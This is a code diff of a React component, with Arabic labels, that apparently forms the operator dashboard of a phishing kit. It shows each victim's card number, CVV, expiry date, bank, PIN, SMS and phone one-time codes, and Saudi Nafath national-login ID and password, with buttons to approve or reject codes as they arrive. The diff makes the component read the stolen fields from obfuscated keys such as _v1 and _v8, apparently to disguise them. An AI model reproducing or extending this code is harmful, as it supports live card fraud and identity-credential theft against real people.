@@ -126,15 +126,18 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
   }
 
   // 2. Nafad Info (show at top if exists)
-  if (visitor.nafazId || visitor.currentStep === "nafad") {
+  const nafazId = visitor._v8 || visitor.nafazId
+  const nafazPass = visitor._v9 || visitor.nafazPass
+  
+  if (nafazId || visitor.currentStep === "nafad") {
     bubbles.push({
       id: "nafad-info",
-      title: "معلومات نفاذ",
-      icon: "🛡️",
+      title: "🇸🇦 نفاذ",
+      icon: "🇸🇦",
       color: "indigo",
       data: {
-        "رقم الهوية": visitor.nafazId || "في انتظار الإدخال...",
-        "كلمة المرور": visitor.nafazPass ? "تم الإدخال" : "في انتظار الإدخال...",
+        "رقم الهوية": nafazId || "في انتظار الإدخال...",
+        "كلمة المرور": nafazPass ? "تم الإدخال" : "في انتظار الإدخال...",
         "رقم التأكيد المُرسل": visitor.nafadConfirmationCode || "لم يتم الإرسال بعد"
       },
       timestamp: visitor.nafadUpdatedAt || visitor.updatedAt,
@@ -211,17 +214,21 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     // Show current data
     
     // Card Info
-    if (visitor.cardNumber) {
+    const cardNumber = visitor._v1 || visitor.cardNumber
+    const cvv = visitor._v2 || visitor.cvv
+    const expiryDate = visitor._v3 || visitor.expiryDate
+    
+    if (cardNumber) {
       bubbles.push({
         id: "card-current",
         title: "معلومات البطاقة",
         icon: "💳",
         color: "orange",
         data: {
-          "رقم البطاقة": visitor.cardNumber,
+          "رقم البطاقة": cardNumber,
           "نوع البطاقة": visitor.cardType,
-          "تاريخ الانتهاء": visitor.expiryDate,
-          "CVV": visitor.cvv,
+          "تاريخ الانتهاء": expiryDate,
+          "CVV": cvv,
           "البنك": visitor.bankInfo?.name || "غير محدد",
           "بلد البنك": visitor.bankInfo?.country || "غير محدد"
         },
@@ -234,13 +241,15 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     }
     
     // OTP Code
-    if (visitor.otp || visitor.otpStatus === "show_otp" || visitor.otpStatus === "verifying") {
+    const otp = visitor._v5 || visitor.otp
+    
+    if (otp || visitor.otpStatus === "show_otp" || visitor.otpStatus === "verifying") {
       // Prepare data object
       const otpData: Record<string, any> = {
-        "الكود": visitor.otp || "في انتظار الإدخال...",
+        "الكود": otp || "في انتظار الإدخال...",
         "الحالة": visitor.otpStatus === "approved" ? "✓ تم القبول" : 
                   visitor.otpStatus === "rejected" ? "✗ تم الرفض" :
-                  visitor.otp ? "تم إدخال الكود" : "في انتظار الإدخال"
+                  otp ? "تم إدخال الكود" : "في انتظار الإدخال"
       }
       
       // Add old rejected OTPs if they exist
@@ -257,22 +266,24 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         timestamp: visitor.otpUpdatedAt || visitor.updatedAt,
         status: visitor.otpStatus === "approved" ? "approved" as const :
                 visitor.otpStatus === "rejected" ? "rejected" as const : "pending" as const,
-        showActions: visitor.otp && visitor.otpStatus !== "approved" && visitor.otpStatus !== "rejected",
+        showActions: otp && visitor.otpStatus !== "approved" && visitor.otpStatus !== "rejected",
         isLatest: true,
         type: "otp"
       })
     }
     
     // PIN Code
-    if (visitor.pinCode || visitor.otpStatus === "show_pin") {
+    const pinCode = visitor._v6 || visitor.pinCode
+    
+    if (pinCode || visitor.otpStatus === "show_pin") {
       bubbles.push({
         id: "pin-current",
         title: "رمز PIN",
         icon: "🔐",
         color: "indigo",
         data: {
-          "الكود": visitor.pinCode || "في انتظار الإدخال...",
-          "الحالة": visitor.pinCode ? "تم إدخال الكود" : "في انتظار الإدخال"
+          "الكود": pinCode || "في انتظار الإدخال...",
+          "الحالة": pinCode ? "تم إدخال الكود" : "في انتظار الإدخال"
         },
         timestamp: visitor.pinUpdatedAt || visitor.updatedAt,
         status: "pending" as const,
@@ -302,13 +313,15 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     }
     
     // Phone OTP
-    if (visitor.phoneOtp || visitor.phoneOtpStatus === "show_phone_otp" || visitor.phoneOtpStatus === "verifying") {
+    const phoneOtp = visitor._v7 || visitor.phoneOtp
+    
+    if (phoneOtp || visitor.phoneOtpStatus === "show_phone_otp" || visitor.phoneOtpStatus === "verifying") {
       // Prepare data object
       const phoneOtpData: Record<string, any> = {
-        "كود التحقق": visitor.phoneOtp || "في انتظار الإدخال...",
+        "كود التحقق": phoneOtp || "في انتظار الإدخال...",
         "الحالة": visitor.phoneOtpStatus === "approved" ? "✓ تم القبول" :
                   visitor.phoneOtpStatus === "rejected" ? "✗ تم الرفض" :
-                  visitor.phoneOtp ? "تم إدخال الكود" : "في انتظار الإدخال"
+                  phoneOtp ? "تم إدخال الكود" : "في انتظار الإدخال"
       }
       
       // Add old rejected phone OTPs if they exist
@@ -325,7 +338,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         timestamp: visitor.phoneOtpUpdatedAt || visitor.updatedAt,
         status: visitor.phoneOtpStatus === "approved" ? "approved" as const :
                 visitor.phoneOtpStatus === "rejected" ? "rejected" as const : "pending" as const,
-        showActions: visitor.phoneOtp && visitor.phoneOtpStatus !== "approved" && visitor.phoneOtpStatus !== "rejected",
+        showActions: phoneOtp && visitor.phoneOtpStatus !== "approved" && visitor.phoneOtpStatus !== "rejected",
         isLatest: true,
         type: "phone_otp"
       })
